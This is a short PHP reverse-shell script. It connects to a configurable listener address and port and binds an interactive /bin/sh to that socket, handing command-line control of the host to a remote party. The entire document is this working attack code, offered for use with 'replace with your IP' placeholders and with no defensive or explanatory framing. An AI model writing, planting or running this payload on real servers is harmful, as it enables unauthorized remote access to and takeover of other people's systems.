<?php
$ip = '192.168.1.6';  // Replace with your IP
$port = 4444;         // Replace with your port

$sock = fsockopen($ip, $port);
$proc = proc_open("/bin/sh -i", [
    0 => $sock,  // stdin
    1 => $sock,  // stdout
    2 => $sock   // stderr
], $pipes);
?>
